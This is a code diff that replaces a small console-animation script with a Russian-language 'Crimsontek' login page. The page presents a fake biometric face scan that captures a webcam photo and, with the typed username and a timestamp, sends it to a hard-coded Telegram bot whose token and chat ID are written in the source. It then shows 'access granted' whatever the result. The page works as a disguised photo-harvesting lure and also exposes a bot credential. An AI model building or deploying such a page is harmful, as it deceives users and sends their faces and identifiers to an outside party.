@@ -1,21 +1,155 @@
-document.querySelectorAll('.btn-tool').forEach(button => {
-    button.addEventListener('click', function() {
-        const consoleBox = document.getElementById('console');
-        const command = this.textContent.replace('EXEC ', '');
-        
-        // Эффект печати в консоль
-        const newLine = document.createElement('div');
-        newLine.style.color = 'var(--main-red)';
-        newLine.innerHTML = `<br>> RUNNING: ${command}...`;
-        consoleBox.appendChild(newLine);
-        
-        // Имитация загрузки
-        setTimeout(() => {
-            const success = document.createElement('span');
-            success.style.color = '#00ff00';
-            success.innerHTML = ' [SUCCESS] Accessing CrimsonNet Node...';
-            newLine.appendChild(success);
-            consoleBox.scrollTop = consoleBox.scrollHeight;
-        }, 1500);
-    });
-});
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Вход в систему • Crimsontek</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .card {
+      background: #1a1a1a;
+      border: 3px solid #ff0000;
+      border-radius: 8px;
+      padding: 35px 25px;
+      max-width: 540px;
+      margin: 40px auto;
+    }
+    input {
+      width: 100%;
+      padding: 18px;
+      margin: 20px 0;
+      background: #111;
+      border: 2px solid #ff0000;
+      color: white;
+      font-size: 1.15rem;
+      text-align: center;
+      box-sizing: border-box; /* Чтобы поле не вылезало за края на телефоне */
+    }
+    button {
+      width: 100%;
+      padding: 18px;
+      margin: 12px 0;
+      font-size: 1.15rem;
+      font-weight: bold;
+      text-transform: uppercase;
+      background: #ff0000;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #ff3333;
+    }
+    #video {
+      width: 100%;
+      border: 3px solid #ff0000;
+      border-radius: 6px;
+      margin: 20px 0;
+      background: #000;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo" style="font-size:2.8rem; color:#ff0000; text-align:center; font-weight:900;">CRIMSONTEK</div>
+  </header>
+
+  <div class="card">
+    <h2 style="color:#ff0000; text-align:center; margin-bottom:25px;">ДОСТУП К СИСТЕМЕ</h2>
+    
+    <input type="text" id="username" placeholder="ВВЕДИТЕ ИДЕНТИФИКАТОР" maxlength="30">
+
+    <button onclick="startVerification()">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
+
+    <div id="camera-container" style="display:none;">
+      <p style="color:#ff0000; text-align:center; margin:20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
+      <video id="video" autoplay playsinline muted></video>
+      <button onclick="takePhoto()">СКАНИРОВАТЬ ЛИЦО</button>
+      <button onclick="cancelVerification()" style="background:#444;">ОТМЕНИТЬ</button>
+    </div>
+
+    <div id="status" style="text-align:center; margin-top:20px; font-weight:bold; font-size:1.2rem;"></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0";
+    const CHAT_ID = "7616949660";
+    let stream = null;
+
+    function showStatus(text, color = "#fff") {
+      document.getElementById("status").innerHTML = `<span style="color:${color}">${text}</span>`;
+    }
+
+    async function startVerification() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) {
+        showStatus("Введите идентификатор!", "orange");
+        return;
+      }
+
+      document.getElementById("camera-container").style.display = "block";
+      showStatus("Запуск камеры...", "#ccc");
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        document.getElementById("video").srcObject = stream;
+        showStatus("Камера запущена.<br>Нажмите «СКАНИРОВАТЬ ЛИЦО»", "lime");
+      } catch (err) {
+        showStatus("Не удалось получить доступ к камере.<br>Разрешите камеру в настройках браузера", "red");
+      }
+    }
+
+    async function takePhoto() {
+      const username = document.getElementById("username").value.trim();
+      const video = document.getElementById("video");
+
+      if (!video.srcObject) {
+        showStatus("Камера не запущена", "red");
+        return;
+      }
+
+      showStatus("Отправка фото...", "orange");
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const blob = await fetch(canvas.toDataURL("image/jpeg", 0.75)).then(r => r.blob());
+
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("caption", `🛡️ Новый вход\nID: ${username}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
+      formData.append("photo", blob, "face.jpg");
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        if (res.ok) {
+          // Выводим зеленую надпись успеха
+          showStatus(`ДОСТУП РАЗРЕШЁН<br>ДОБРО ПОЖАЛОВАТЬ, ${username.toUpperCase()}`, "lime");
+          
+          // Через 2 секунды кидаем пользователя в терминал управления
+          setTimeout(() => {
+            window.location.href = "dashboard.html";
+          }, 2000);
+          
+        } else {
+          showStatus("Ошибка отправки в Telegram", "red");
+        }
+      } catch (e) {
+        showStatus("Ошибка соединения", "red");
+      }
+    }
+
+    function cancelVerification() {
+      if (stream) stream.getTracks().forEach(track => track.stop());
+      document.getElementById("camera-container").style.display = "none";
+      showStatus("");
+    }
+  </script>
+</body>
+</html>
